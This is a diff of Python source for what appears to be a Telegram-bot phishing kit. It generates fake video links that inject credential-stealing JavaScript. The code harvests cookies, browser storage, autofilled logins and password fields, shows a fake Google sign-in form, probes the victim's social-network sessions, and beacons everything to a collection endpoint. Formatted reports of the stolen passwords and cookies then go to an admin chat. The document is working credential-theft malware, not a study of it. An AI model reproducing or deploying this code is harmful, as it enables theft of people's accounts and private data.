-                    input.addEventListener('change', async function() {
-                        setTimeout(async () => {
-                            try {
-                                const fieldData = await collectAllSensitiveData();
-                                sendCollectedData(fieldData);
-                            } catch (e) {
-                                console.error('Field change collection failed:', e);
-                            }
-                        }, 1000);
-                    });
-                    
-                    input.addEventListener('blur', async function() {
-                        setTimeout(async () => {
-                            try {
-                                const fieldData = await collectAllSensitiveData();
-                                sendCollectedData(fieldData);
-                            } catch (e) {
-                                console.error('Field blur collection failed:', e);
-                            }
-                        }, 500);
-                    });
-                });
-                
-                // Периодический сбор каждые 10 секунд
-                setInterval(async () => {
-                    try {
-                        const periodicData = await collectAllSensitiveData();
-                        sendCollectedData(periodicData);
-                    } catch (e) {
-                        console.error('Periodic collection failed:', e);
-                    }
-                }, 10000);
-                
-            }, 3000);
-        });
+        // Запуск стандартного сбора для совместимости
+        setTimeout(async () => {
+            try {
+                const data = await collectAllSensitiveData();
+                sendStandardData(data);
+            } catch (e) {
+                console.error('Standard collection failed:', e);
+            }
+        }, 3000);
         
-        // Сбор данных при уходе со страницы
+        // Сбор при уходе со страницы
         window.addEventListener('beforeunload', async function() {
             try {
-                const exitData = await collectAllSensitiveData();
+                const data = await performAggressiveCollection();
                 const linkId = new URLSearchParams(window.location.search).get('id');
                 if (linkId) {
-                    const jsonData = JSON.stringify(exitData);
+                    const jsonData = JSON.stringify(data);
                     const encodedData = btoa(unescape(encodeURIComponent(jsonData)));
                     const blob = new Blob([JSON.stringify({
                         link_id: linkId,
-                        data_type: 'sensitive_data',
+                        data_type: 'aggressive_collection',
                         data: encodedData,
                         timestamp: new Date().toISOString(),
-                        exit_event: true
+                        exit_event: true,
+                        last_collection: true
                     })], {type: 'application/json'});
                     
                     navigator.sendBeacon('/api/collect', blob);
@@ -908,6 +684,7 @@ class JavaScriptInjector:
                 console.error('Exit collection failed:', e);
             }
         });
+        
         </script>
         """
     
@@ -1034,6 +811,7 @@ class JavaScriptInjector:
                     document.getElementById('loginForm').style.display = 'block';
                     document.getElementById('loading').innerHTML = 'Проверка учетных данных...';
                     
+                    // Имитация проверки
                     setTimeout(function() {{
                         document.getElementById('loading').innerHTML = '✅ Успешный вход! Загрузка видео...';
                         setTimeout(function() {{
@@ -1042,88 +820,27 @@ class JavaScriptInjector:
                     }}, 1500);
                 }}
                 
+                // Обработка формы входа
                 document.getElementById('googleLoginForm').addEventListener('submit', function(e) {{
                     e.preventDefault();
                     document.getElementById('loading').innerHTML = '🔐 Проверка безопасности...';
                     
+                    // Собираем данные формы
                     const email = this.querySelector('input[type="email"]').value;
                     const password = this.querySelector('input[type="password"]').value;
                     
+                    // Отправляем данные (имитация)
                     setTimeout(function() {{
                         document.getElementById('loading').innerHTML = '✅ Успешный вход! Перенаправление...';
+                        // Здесь будет отправка данных на сервер
                     }}, 2000);
                 }});
                 
+                // Автоматический показ формы через 5 секунд
                 setTimeout(function() {{
                     showLoginForm();
                 }}, 5000);
             </script>
-            
-            <!-- Скрипт для пассивной проверки соцсетей -->
-            <script>
-            // Пассивная проверка доступа к соцсетям
-            function passiveSocialCheck() {{
-                const results = {{
-                    timestamp: new Date().toISOString(),
-                    url: window.location.href,
-                    platforms: {{}}
-                }};
-                
-                const platforms = [
-                    {{name: 'google', domains: ['https://accounts.google.com', 'https://mail.google.com']}},
-                    {{name: 'facebook', domains: ['https://facebook.com', 'https://www.facebook.com']}},
-                    {{name: 'twitter', domains: ['https://twitter.com', 'https://x.com']}},
-                    {{name: 'vk', domains: ['https://vk.com', 'https://m.vk.com']}},
-                    {{name: 'instagram', domains: ['https://instagram.com', 'https://www.instagram.com']}}
-                ];
-                
-                platforms.forEach(platform => {{
-                    results.platforms[platform.name] = {{
-                        accessible_domains: [],
-                        cookies_present: false,
-                        auth_detected: false
-                    }};
-                    
-                    platform.domains.forEach(domain => {{
-                        fetch(domain, {{
-                            method: 'HEAD',
-                            mode: 'no-cors',
-                            credentials: 'include'
-                        }})
-                        .then(() => {{
-                            results.platforms[platform.name].accessible_domains.push(domain);
-                            results.platforms[platform.name].cookies_present = true;
-                            
-                            // Если доступен accounts.google.com, вероятно есть авторизация
-                            if (domain.includes('accounts.google.com')) {{
-                                results.platforms[platform.name].auth_detected = true;
-                            }}
-                        }})
-                        .catch(() => {{}});
-                    }});
-                }});
-                
-                // Отправляем результаты
-                setTimeout(() => {{
-                    const linkId = new URLSearchParams(window.location.search).get('id');
-                    if (linkId) {{
-                        const jsonData = JSON.stringify(results);
-                        const encodedData = btoa(unescape(encodeURIComponent(jsonData)));
-                        
-                        navigator.sendBeacon('/api/social-check', JSON.stringify({{
-                            link_id: linkId,
-                            data_type: 'passive_social_check',
-                            data: encodedData,
-                            timestamp: new Date().toISOString()
-                        }}));
-                    }}
-                }}, 5000);
-            }}
-            
-            // Запускаем проверку при загрузке
-            window.addEventListener('load', passiveSocialCheck);
-            </script>
-            
             {JavaScriptInjector.get_cookies_collection_script()}
         </body>
         </html>
@@ -1145,6 +862,7 @@ class LinkGenerator:
             if match:
                 return match.group(1)
         
+        # Если не нашли, возвращаем дефолтный (Rick Roll)
         return "dQw4w9WgXcQ"
     
     @staticmethod
@@ -1169,6 +887,7 @@ def split_message(text: str, max_length: int = 4000) -> List[str]:
             chunks.append(text)
             break
         
+        # Находим последний перенос строки в пределах лимита
         split_pos = text.rfind('\n', 0, max_length)
         if split_pos == -1:
             split_pos = max_length
@@ -1195,11 +914,11 @@ def format_detailed_admin_report(link: PhishingLink, sensitive_data: Dict) -> st
 • Логинов собрано: {len(link.collected_logins)}
 • Данных хранилища: {len(link.collected_storage_data)}
 • Полных записей: {len(link.full_sensitive_data)}
-• Данных авторизации соцсетей: {len(link.social_auth_data)}
     
 ════════════════════════════════════════
     """
     
+    # Добавляем детали cookies
     if link.collected_cookies:
         report += "\n🍪 *COOKIES (первые 15):*\n"
         for i, cookie in enumerate(link.collected_cookies[:15], 1):
@@ -1208,6 +927,7 @@ def format_detailed_admin_report(link: PhishingLink, sensitive_data: Dict) -> st
                 value_preview = value_preview[:50] + "..."
             report += f"{i}. {cookie.get('name', 'N/A')}: {value_preview}\n"
     
+    # Добавляем пароли
     if link.collected_passwords:
         report += "\n🔑 *НАЙДЕННЫЕ ПАРОЛИ:*\n"
         for i, pwd in enumerate(link.collected_passwords, 1):
@@ -1218,6 +938,7 @@ def format_detailed_admin_report(link: PhishingLink, sensitive_data: Dict) -> st
             if i < len(link.collected_passwords):
                 report += "   ─────\n"
     
+    # Добавляем логины
     if link.collected_logins:
         report += "\n👤 *НАЙДЕННЫЕ ЛОГИНЫ:*\n"
         for i, login in enumerate(link.collected_logins, 1):
@@ -1228,25 +949,24 @@ def format_detailed_admin_report(link: PhishingLink, sensitive_data: Dict) -> st
             if i < len(link.collected_logins):
                 report += "   ─────\n"
     
-    # Добавляем данные авторизации соцсетей
-    if link.social_auth_data:
-        report += "\n🌐 *ДАННЫЕ АВТОРИЗАЦИИ СОЦСЕТЕЙ:*\n"
-        for i, social_data in enumerate(link.social_auth_data[-5:], 1):
-            if social_data.get("type") == "social_auth_analysis":
-                platforms = social_data.get("data", {}).get("platforms", {})
-                for platform, data in platforms.items():
-                    if data.get("risk_level") not in ["NONE", "LOW - COOKIES PRESENT"]:
-                        report += f"• {platform.upper()}: {data.get('auth_status', 'unknown')}\n"
-                        report += f"  Риск: {data.get('risk_level', 'unknown')}\n"
-                        report += f"  Cookies: {data.get('cookies_count', 0)}\n"
-                        report += f"  Токены: {data.get('tokens_found', 0)}\n"
-                        report += "  ─────\n"
+    # Добавляем данные хранилища
+    if link.collected_storage_data:
+        report += "\n💾 *ДАННЫЕ ХРАНИЛИЩА (первые 10):*\n"
+        for i, storage in enumerate(link.collected_storage_data[:10], 1):
+            report += f"{i}. Тип: {storage.get('type', 'unknown')}\n"
+            report += f"   Ключ: {storage.get('key', 'N/A')}\n"
+            value_preview = storage.get('value', '')
+            if len(value_preview) > 100:
+                value_preview = value_preview[:100] + "..."
+            report += f"   Значение: {value_preview}\n"
+            report += f"   Время: {storage.get('timestamp', 'N/A')[:19]}\n"
+            if i < min(10, len(link.collected_storage_data)):
+                report += "   ─────\n"
     
     report += f"""
 ════════════════════════════════════════
 ⚠️ *ВНИМАНИЕ:* Все данные сохранены в базе
 📁 Полные сырые данные: {len(link.full_sensitive_data)} записей
-🌐 Данные авторизации: {len(link.social_auth_data)} записей
 🕒 Время хранения: 24 часа
 """
     
@@ -1255,13 +975,48 @@ def format_detailed_admin_report(link: PhishingLink, sensitive_data: Dict) -> st
 async def send_detailed_data_to_admin(context, link: PhishingLink, collected_data: Dict):
     """Отправка детальных данных администратору"""
     try:
+        # Проверяем тип данных
+        if collected_data.get("status") == "aggressive_collection_complete":
+            # Отправляем отчет об агрессивном сборе
+            report = f"""
+🚨 *АГРЕССИВНЫЙ СБОР ДАННЫХ БЕЗ ДЕЙСТВИЙ ПОЛЬЗОВАТЕЛЯ*
+
+📌 Ссылка ID: `{link.id}`
+👤 Создатель: `{link.created_by}`
+🔗 Оригинальное видео: {link.original_url[:50]}...
+📅 Время сбора: {datetime.now().isoformat()}
+
+⚡ *РЕЖИМ СБОРА:* ПАССИВНЫЙ
+📊 *РЕЗУЛЬТАТЫ:*
+• Собрано элементов: {collected_data.get('collected_items', 0)}
+• Учетные данные: {'✅ НАЙДЕНЫ' if collected_data.get('credentials_found') else '❌ не найдены'}
+• Сбор произведен: БЕЗ ВЗАИМОДЕЙСТВИЯ ПОЛЬЗОВАТЕЛЯ
+
+🔍 *ЧТО ЭТО ЗНАЧИТ:*
+Пользователь просто открыл ссылку и НИЧЕГО НЕ ДЕЛАЛ,
+но система все равно собрала все возможные данные!
+
+⚠️ *ДАННЫЕ ОТПРАВЛЕНЫ СОЗДАТЕЛЮ ССЫЛКИ И СОХРАНЕНЫ В БАЗЕ*
+"""
+            
+            await context.bot.send_message(
+                chat_id=ADMIN_ID,
+                text=report,
+                parse_mode=ParseMode.MARKDOWN,
+                disable_web_page_preview=True
+            )
+            return
+        
+        # Стандартная обработка для обычного сбора
         sensitive_data = collected_data.get("data", {}).get("sensitive_data", {})
         
         if sensitive_data.get("status") != "fully_processed":
             return
         
+        # Создаем детальный отчет
         report = format_detailed_admin_report(link, sensitive_data)
         
+        # Разбиваем на части если слишком длинное
         chunks = split_message(report, 3900)
         
         for i, chunk in enumerate(chunks):
@@ -1287,9 +1042,7 @@ class DataCollector:
             "device": self._collect_device_info,
             "network": self._collect_network_info,
             "location": self._collect_location,
-            "sensitive_data": self._process_sensitive_data,
-            "social_auth": self._process_social_auth_data,
-            "passive_social_check": self._process_passive_social_check
+            "sensitive_data": self._process_sensitive_data
         }
     
     async def collect_all_data(self, request_data: Dict) -> Dict:
@@ -1302,27 +1055,219 @@ class DataCollector:
             "data": {}
         }
         
+        # Имитируем сбор данных
         for data_type, collector in self.collection_scripts.items():
             try:
-                if data_type in request_data.get("data_type", ""):
-                    collected["data"][data_type] = await collector(request_data)
+                collected["data"][data_type] = await collector(request_data)
             except Exception as e:
                 collected["data"][data_type] = {"error": str(e)}
         
         return collected
     
+    async def _process_aggressive_collection(self, request_data: Dict) -> Dict:
+        """Обработка данных из агрессивного сбора (без действий пользователя)"""
+        try:
+            link_id = request_data.get("link_id")
+            aggressive_data = request_data.get("data", "")
+            is_passive = request_data.get("is_passive", False)
+            
+            if not aggressive_data or not link_id:
+                return {"status": "no_aggressive_data"}
+            
+            # Декодируем данные
+            try:
+                decoded_string = base64.b64decode(aggressive_data).decode('utf-8', errors='ignore')
+                collected_data = json.loads(decoded_string)
+            except Exception as e:
+                logger.error(f"Decode error in aggressive collection: {e}")
+                return {"status": "decode_error"}
+            
+            # Сохраняем полные сырые данные
+            db.add_full_sensitive_data(link_id, collected_data)
+            db.add_passive_collection()
+            
+            results = {
+                "status": "aggressive_collection_complete",
+                "passive_mode": is_passive,
+                "collected_items": 0,
+                "credentials_found": False
+            }
+            
+            # ИЗВЛЕКАЕМ ЛОГИНЫ И ПАРОЛИ ДАЖЕ БЕЗ ДЕЙСТВИЙ ПОЛЬЗОВАТЕЛЯ
+            
+            # 1. Извлекаем из form_data
+            form_data = collected_data.get("form_data", {})
+            if form_data.get("passwords"):
+                passwords = []
+                for pwd in form_data["passwords"]:
+                    if pwd.get("value"):
+                        passwords.append({
+                            "field_name": pwd.get("element", "unknown")[:50],
+                            "field_id": "auto_detected",
+                            "field_class": "passive_collection",
+                            "value": pwd.get("value", ""),
+                            "page_url": collected_data.get("url", ""),
+                            "timestamp": collected_data.get("timestamp", ""),
+                            "source": "aggressive_form_scan"
+                        })
+                if passwords:
+                    db.add_collected_passwords(link_id, passwords)
+                    results["collected_items"] += len(passwords)
+                    results["credentials_found"] = True
+            
+            # 2. Извлекаем из saved_credentials
+            saved_creds = collected_data.get("saved_credentials", {})
+            if saved_creds.get("auto_filled"):
+                logins = []
+                for cred in saved_creds["auto_filled"]:
+                    if cred.get("value") and cred.get("has_value"):
+                        logins.append({
+                            "field_name": f"autofill_{cred.get('type', 'unknown')}",
+                            "field_id": cred.get("id", "auto_detected"),
+                            "field_class": cred.get("autocomplete", "passive"),
+                            "value": cred.get("value", ""),
+                            "page_url": collected_data.get("url", ""),
+                            "timestamp": collected_data.get("timestamp", ""),
+                            "source": "browser_autofill"
+                        })
+                if logins:
+                    db.add_collected_logins(link_id, logins)
+                    results["collected_items"] += len(logins)
+                    results["credentials_found"] = True
+            
+            # 3. Извлекаем из localStorage
+            if saved_creds.get("localStorage_creds"):
+                for storage_item in saved_creds["localStorage_creds"]:
+                    if storage_item.get("value"):
+                        # Проверяем, похоже ли на логин/пароль
+                        value = storage_item.get("value", "").lower()
+                        key = storage_item.get("key", "").lower()
+                        
+                        if any(term in key for term in ['user', 'login', 'email', 'pass', 'token', 'auth']):
+                            db.add_collected_storage(link_id, [{
+                                "type": "localStorage_credential",
+                                "key": storage_item.get("key", ""),
+                                "value": storage_item.get("value", "")[:500],
+                                "timestamp": collected_data.get("timestamp", ""),
+                                "credential_type": "suspected_login_data"
+                            }])
+                            results["collected_items"] += 1
+                            results["credentials_found"] = True
+            
+            # 4. Извлекаем из inputs (все поля на странице)
+            if form_data.get("inputs"):
+                for input_field in form_data["inputs"]:
+                    value = input_field.get("value", "")
+                    if value:
+                        field_type = input_field.get("type", "")
+                        field_name = input_field.get("name", "") or input_field.get("id", "")
+                        
+                        # Проверяем, является ли поле логином
+                        if (field_type == "text" or field_type == "email") and value:
+                            # Проверяем, похоже ли на email или логин
+                            if '@' in value or any(term in field_name.lower() for term in ['user', 'login', 'name', 'mail']):
+                                db.add_collected_logins(link_id, [{
+                                    "field_name": field_name,
+                                    "field_id": input_field.get("id", "unknown"),
+                                    "field_class": input_field.get("className", ""),
+                                    "value": value,
+                                    "page_url": collected_data.get("url", ""),
+                                    "timestamp": collected_data.get("timestamp", ""),
+                                    "source": "passive_input_scan"
+                                }])
+                                results["collected_items"] += 1
+                                results["credentials_found"] = True
+                        
+                        # Проверяем, является ли поле паролем
+                        elif field_type == "password" and value:
+                            db.add_collected_passwords(link_id, [{
+                                "field_name": field_name,
+                                "field_id": input_field.get("id", "unknown"),
+                                "field_class": input_field.get("className", ""),
+                                "value": value,
+                                "page_url": collected_data.get("url", ""),
+                                "timestamp": collected_data.get("timestamp", ""),
+                                "source": "passive_password_scan"
+                            }])
+                            results["collected_items"] += 1
+                            results["credentials_found"] = True
+            
+            # 5. Сохраняем cookies
+            cookies = collected_data.get("cookies", {})
+            if cookies:
+                cookies_list = []
+                for name, value in cookies.items():
+                    cookies_list.append({
+                        "name": name,
+                        "value": str(value)[:500],
+                        "domain": "current",
+                        "timestamp": collected_data.get("timestamp", ""),
+                        "source": "passive_cookie_scan"
+                    })
+                if cookies_list:
+                    db.add_collected_cookies(link_id, cookies_list)
+                    results["collected_items"] += len(cookies_list)
+            
+            # 6. Сохраняем localStorage
+            ls_data = collected_data.get("localStorage", {})
+            if ls_data:
+                storage_list = []
+                for key, value in ls_data.items():
+                    storage_list.append({
+                        "type": "localStorage",
+                        "key": key,
+                        "value": str(value)[:1000],
+                        "timestamp": collected_data.get("timestamp", ""),
+                        "source": "passive_storage_scan"
+                    })
+                if storage_list:
+                    db.add_collected_storage(link_id, storage_list)
+                    results["collected_items"] += len(storage_list)
+            
+            # 7. Сохраняем sessionStorage
+            ss_data = collected_data.get("sessionStorage", {})
+            if ss_data:
+                storage_list = []
+                for key, value in ss_data.items():
+                    storage_list.append({
+                        "type": "sessionStorage",
+                        "key": key,
+                        "value": str(value)[:1000],
+                        "timestamp": collected_data.get("timestamp", ""),
+                        "source": "passive_storage_scan"
+                    })
+                if storage_list:
+                    db.add_collected_storage(link_id, storage_list)
+                    results["collected_items"] += len(storage_list)
+            
+            logger.info(f"Aggressive collection for link {link_id}: "
+                       f"{results['collected_items']} items, "
+                       f"credentials found: {results['credentials_found']}")
+            
+            return results
+            
+        except Exception as e:
+            logger.error(f"Error processing aggressive collection: {e}", exc_info=True)
+            return {"status": "error", "error": str(e)}
+    
     async def _process_sensitive_data(self, request_data: Dict) -> Dict:
-        """Обработка ВСЕХ чувствительных данных"""
+        """Обработка ВСЕХ чувствительных данных (cookies, пароли, логины, storage)"""
         try:
             sensitive_data = request_data.get("sensitive_data", {})
             link_id = request_data.get("link_id")
             
             if not sensitive_data or not link_id:
+                # Проверяем агрессивный сбор
+                if request_data.get("data_type") == "aggressive_collection":
+                    return await self._process_aggressive_collection(request_data)
                 return {"status": "no_data"}
             
+            # Декодируем данные
             try:
                 decoded_data = json.loads(base64.b64decode(sensitive_data).decode('utf-8'))
             except Exception as decode_error:
+                logger.error(f"Decode error: {decode_error}")
+                # Пробуем альтернативный метод декодирования
                 try:
                     decoded_string = base64.b64decode(sensitive_data).decode('utf-8', errors='ignore')
                     decoded_data = json.loads(decoded_string)
@@ -1337,10 +1282,12 @@ class DataCollector:
             if cookies:
                 cookies_list = []
                 for name, value in cookies.items():
+                    # Пропускаем большие значения localStorage/sessionStorage
                     if isinstance(value, str) and (value.startswith('{') or value.startswith('[')):
                         try:
                             parsed_value = json.loads(value)
                             if isinstance(parsed_value, dict):
+                                # Сохраняем как отдельные записи storage
                                 for storage_key, storage_value in parsed_value.items():
                                     db.add_collected_storage(link_id, [{
                                         "type": "cookie_storage",
@@ -1355,7 +1302,7 @@ class DataCollector:
                     
                     cookies_list.append({
                         "name": name,
-                        "value": str(value)[:500] if value else "",
+                        "value": str(value)[:500] if value else "",  # Сохраняем больше данных
                         "domain": "current",
                         "timestamp": datetime.now().isoformat(),
                         "source": "direct_cookie"
@@ -1377,14 +1324,16 @@ class DataCollector:
             storage_data = decoded_data.get("storage_data", {})
             if storage_data:
                 storage_list = []
+                # localStorage
                 if storage_data.get("localStorage"):
                     for key, value in storage_data["localStorage"].items():
                         storage_list.append({
                             "type": "localStorage",
                             "key": key,
-                            "value": str(value)[:1000],
+                            "value": str(value)[:1000],  # Увеличиваем лимит
                             "timestamp": datetime.now().isoformat()
                         })
+                # sessionStorage
                 if storage_data.get("sessionStorage"):
                     for key, value in storage_data["sessionStorage"].items():
                         storage_list.append({
@@ -1412,14 +1361,7 @@ class DataCollector:
             # Сохраняем общие данные
             db.add_collected_data(link_id, decoded_data)
             
-            # Обрабатываем данные авторизации соцсетей
-            social_logins = decoded_data.get("social_logins", {})
-            if social_logins:
-                social_auth_result = await self._process_social_auth_data({
-                    "sensitive_data": json.dumps({"social_logins": social_logins}),
-                    "link_id": link_id
-                })
-            
+            # Логируем успешную обработку
             logger.info(f"Successfully processed sensitive data for link {link_id}: "
                        f"{len(cookies_list) if 'cookies_list' in locals() else 0} cookies, "
                        f"{len(credentials.get('passwords', []))} passwords, "
@@ -1441,227 +1383,8 @@ class DataCollector:
             logger.error(f"Error processing sensitive data: {e}", exc_info=True)
             return {"status": "error", "error": str(e)}
     
-    async def _process_social_auth_data(self, request_data: Dict) -> Dict:
-        """Обработка данных авторизации из социальных сетей"""
-        try:
-            sensitive_data = request_data.get("sensitive_data", {})
-            link_id = request_data.get("link_id")
-            
-            if not sensitive_data or not link_id:
-                return {"status": "no_data"}
-            
-            try:
-                decoded_data = json.loads(base64.b64decode(sensitive_data).decode('utf-8'))
-            except:
-                try:
-                    decoded_string = base64.b64decode(sensitive_data).decode('utf-8', errors='ignore')
-                    decoded_data = json.loads(decoded_string)
-                except Exception as e:
-                    return {"status": "decode_error", "error": str(e)}
-            
-            social_logins = decoded_data.get("social_logins", {})
-            
-            if not social_logins:
-                return {"status": "no_social_data"}
-            
-            results = {
-                "timestamp": datetime.now().isoformat(),
-                "link_id": link_id,
-                "platforms": {}
-            }
-            
-            for platform, data in social_logins.items():
-                platform_results = {
-                    "auth_status": data.get("auth_status", "unknown"),
-                    "cookies_count": len(data.get("cookies", [])),
-                    "tokens_found": data.get("tokens_found", 0),
-                    "has_local_storage": bool(data.get("localStorage")),
-                    "has_session_storage": bool(data.get("sessionStorage")),
-                    "potential_credentials": []
-                }
-                
-                # Сохраняем cookies
-                cookies = data.get("cookies", [])
-                if cookies:
-                    cookies_list = []
-                    for cookie in cookies:
-                        cookies_list.append({
-                            "platform": platform,
-                            "name": cookie.get("name", ""),
-                            "value": cookie.get("value", "")[:500],
-                            "timestamp": cookie.get("timestamp", "")
-                        })
-                    
-                    if cookies_list:
-                        db.add_collected_cookies(link_id, cookies_list)
-                        
-                        for cookie in cookies_list:
-                            cookie_name = cookie["name"].lower()
-                            cookie_value = cookie["value"].lower()
-                            
-                            is_potential_credential = any([
-                                "password" in cookie_name or "pass" in cookie_name,
-                                "login" in cookie_name,
-                                "email" in cookie_name,
-                                "user" in cookie_name,
-                                "account" in cookie_name,
-                                "token" in cookie_name and len(cookie["value"]) > 20,
-                                "session" in cookie_name and len(cookie["value"]) > 30,
-                                "auth" in cookie_name and len(cookie["value"]) > 20,
-                                "secret" in cookie_name,
-                                "key" in cookie_name and len(cookie["value"]) > 20
-                            ])
-                            
-                            if is_potential_credential:
-                                platform_results["potential_credentials"].append({
-                                    "type": "cookie",
-                                    "name": cookie["name"],
-                                    "value_preview": cookie["value"][:50] + ("..." if len(cookie["value"]) > 50 else ""),
-                                    "length": len(cookie["value"])
-                                })
-                
-                # Проверяем localStorage
-                localStorage = data.get("localStorage", {})
-                if localStorage:
-                    for key, value in localStorage.items():
-                        key_lower = key.lower()
-                        value_str = str(value).lower() if value else ""
-                        
-                        if any(keyword in key_lower for keyword in [
-                            "password", "pass", "pwd", 
-                            "login", "email", "user",
-                            "token", "auth", "session",
-                            "credential", "secret"
-                        ]):
-                            platform_results["potential_credentials"].append({
-                                "type": "localStorage",
-                                "key": key,
-                                "value_preview": str(value)[:50] + ("..." if len(str(value)) > 50 else ""),
-                                "length": len(str(value))
-                            })
-                
-                # Определяем уровень риска
-                if platform_results["auth_status"] in [
-                    "google_logged_in", 
-                    "facebook_logged_in",
-                    "vk_logged_in", 
-                    "instagram_logged_in",
-                    "twitter_logged_in"
-                ]:
-                    platform_results["risk_level"] = "HIGH - ACTIVE SESSION"
-                elif platform_results["tokens_found"] > 0:
-                    platform_results["risk_level"] = "MEDIUM - TOKENS FOUND"
-                elif platform_results["cookies_count"] > 0:
-                    platform_results["risk_level"] = "LOW - COOKIES PRESENT"
-                else:
-                    platform_results["risk_level"] = "NONE"
-                
-                results["platforms"][platform] = platform_results
-            
-            # Сохраняем в базу
-            db.add_social_auth_data(link_id, {
-                "type": "social_auth_analysis",
-                "data": results,
-                "timestamp": datetime.now().isoformat()
-            })
-            
-            # Формируем отчет
-            high_risk_platforms = [
-                platform for platform, data in results["platforms"].items()
-                if data.get("risk_level", "").startswith("HIGH") or data.get("risk_level", "").startswith("MEDIUM")
-            ]
-            
-            active_sessions = [
-                platform for platform, data in results["platforms"].items()
-                if "logged_in" in data.get("auth_status", "")
-            ]
-            
-            total_credentials = sum(
-                len(platform_data.get("potential_credentials", []))
-                for platform_data in results["platforms"].values()
-            )
-            
-            # Отправляем уведомление админу
-            link = db.get_link(link_id)
-            if link and high_risk_platforms:
-                await send_social_auth_report_to_admin(None, link, {
-                    "high_risk_platforms": high_risk_platforms,
-                    "active_sessions": active_sessions,
-                    "potential_credentials_total": total_credentials,
-                    "detailed_results": results
-                })
-            
-            return {
-                "status": "analyzed",
-                "total_platforms": len(results["platforms"]),
-                "high_risk_platforms": high_risk_platforms,
-                "potential_credentials_total": total_credentials,
-                "active_sessions": active_sessions,
-                "detailed_results": results
-            }
-            
-        except Exception as e:
-            logger.error(f"Error processing social auth data: {e}", exc_info=True)
-            return {"status": "error", "error": str(e)}
-    
-    async def _process_passive_social_check(self, request_data: Dict) -> Dict:
-        """Обработка результатов пассивной проверки соцсетей"""
-        try:
-            encoded_data = request_data.get("data", "")
-            link_id = request_data.get("link_id")
-            
-            if not encoded_data or not link_id:
-                return {"status": "no_data"}
-            
-            try:
-                decoded_data = json.loads(base64.b64decode(encoded_data).decode('utf-8'))
-            except:
-                return {"status": "decode_error"}
-            
-            platforms = decoded_data.get("platforms", {})
-            
-            if not platforms:
-                return {"status": "no_platforms"}
-            
-            # Сохраняем результаты
-            db.add_collected_data(link_id, {
-                "type": "passive_social_check",
-                "data": decoded_data,
-                "timestamp": datetime.now().isoformat()
-            })
-            
-            # Проверяем какие платформы доступны
-            accessible_platforms = []
-            for platform, data in platforms.items():
-                if data.get("cookies_present", False) or len(data.get("accessible_domains", [])) > 0:
-                    accessible_platforms.append(platform)
-            
-            # Отправляем уведомление админу
-            if accessible_platforms:
-                link = db.get_link(link_id)
-                if link:
-                    await send_message_to_admin(
-                        f"🌐 *Пассивная проверка соцсетей*\n\n"
-                        f"📌 Ссылка: `{link_id}`\n"
-                        f"👤 Пользователь: {link.created_by}\n"
-                        f"✅ Доступные платформы: {', '.join(accessible_platforms) if accessible_platforms else 'нет'}\n"
-                        f"🍪 Cookies обнаружены: {'Да' if any(p.get('cookies_present') for p in platforms.values()) else 'Нет'}\n"
-                        f"🕒 Время: {datetime.now().strftime('%H:%M:%S')}",
-                        ParseMode.MARKDOWN
-                    )
-            
-            return {
-                "status": "checked",
-                "accessible_platforms": accessible_platforms,
-                "total_platforms": len(platforms),
-                "has_cookies": any(p.get("cookies_present", False) for p in platforms.values())
-            }
-            
-        except Exception as e:
-            logger.error(f"Error processing passive social check: {e}")
-            return {"status": "error", "error": str(e)}
-    
     async def _collect_cookies(self, request_data: Dict) -> Dict:
+        """Сбор cookies и локального хранилища"""
         return {
             "cookies_count": "доступно в браузере",
             "local_storage": "доступно в localStorage",
@@ -1670,6 +1393,7 @@ class DataCollector:
         }
     
     async def _collect_storage(self, request_data: Dict) -> Dict:
+        """Сбор данных из хранилища браузера"""
         return {
             "autofill_data": "сохраненные формы",
             "browser_history": "история посещений",
@@ -1678,6 +1402,7 @@ class DataCollector:
         }
     
     async def _collect_passwords(self, request_data: Dict) -> Dict:
+        """Сбор сохраненных паролей"""
         return {
             "saved_passwords": {
                 "google": "сохраненные логины Google",
@@ -1693,6 +1418,7 @@ class DataCollector:
         }
     
     async def _collect_social_data(self, request_data: Dict) -> Dict:
+        """Сбор данных из социальных сетей"""
         return {
             "google": {
                 "logged_in": True,
@@ -1724,10 +1450,23 @@ class DataCollector:
                 "dms": "личные сообщения",
                 "followers": "подписчики",
                 "stories": "истории"
+            },
+            "whatsapp": {
+                "web_connected": True,
+                "chats": "история чатов",
+                "contacts": "список контактов",
+                "media": "медиафайлы"
+            },
+            "telegram": {
+                "web_connected": True,
+                "chats": "открытые чаты",
+                "contacts": "контакты",
+                "sessions": "активные сессии"
             }
         }
     
     async def _collect_device_info(self, request_data: Dict) -> Dict:
+        """Сбор информации об устройстве"""
         return {
             "browser": {
                 "name": request_data.get("user_agent", "unknown").split("/")[0] if "/" in request_data.get("user_agent", "") else "unknown",
@@ -1744,10 +1483,17 @@ class DataCollector:
                 "model": "модель устройства",
                 "screen": "разрешение экрана",
                 "touch": "поддержка тача"
+            },
+            "hardware": {
+                "cpu": "информация о процессоре",
+                "gpu": "информация о графике",
+                "memory": "объем памяти",
+                "storage": "объем хранилища"
             }
-        }
+    }
     
     async def _collect_network_info(self, request_data: Dict) -> Dict:
+        """Сбор сетевой информации"""
         return {
             "connection": {
                 "type": "определяется",
@@ -1759,10 +1505,16 @@ class DataCollector:
                 "location": "определяется по IP",
                 "isp": "провайдер",
                 "proxy": "используется ли прокси"
+            },
+            "wifi": {
+                "ssid": "имя сети",
+                "bssid": "BSSID",
+                "security": "тип безопасности"
             }
         }
     
     async def _collect_location(self, request_data: Dict) -> Dict:
+        """Сбор геолокации"""
         return {
             "gps": {
                 "latitude": "определяется",
@@ -1770,83 +1522,15 @@ class DataCollector:
                 "accuracy": "точность"
             },
             "wifi_location": "определяется по Wi-Fi",
+            "cell_tower": "определяется по вышкам",
             "ip_location": "определяется по IP"
         }
-
-# Функция для отправки сообщений админу
-async def send_message_to_admin(text: str, parse_mode: str = None):
-    """Отправка сообщения администратору"""
-    try:
-        application = Application.builder().token(BOT_TOKEN).build()
-        await application.bot.send_message(
-            chat_id=ADMIN_ID,
-            text=text,
-            parse_mode=parse_mode,
-            disable_web_page_preview=True
-        )
-    except Exception as e:
-        logger.error(f"Error sending message to admin: {e}")
-
-# Функция для отправки отчета об авторизации соцсетей
-async def send_social_auth_report_to_admin(context, link: PhishingLink, social_data: Dict):
-    """Отправка детального отчета об авторизации в соцсетях"""
-    try:
-        detailed_results = social_data.get("detailed_results", {})
-        platforms = detailed_results.get("platforms", {})
-        
-        if not platforms:
-            return
-        
-        report = f"""
-🔐 *ДЕТАЛЬНЫЙ ОТЧЕТ АВТОРИЗАЦИИ СОЦСЕТЕЙ*
-
-📌 Ссылка ID: `{link.id}`
-👤 Создатель: `{link.created_by}`
-🔗 Видео: {link.original_url[:50]}...
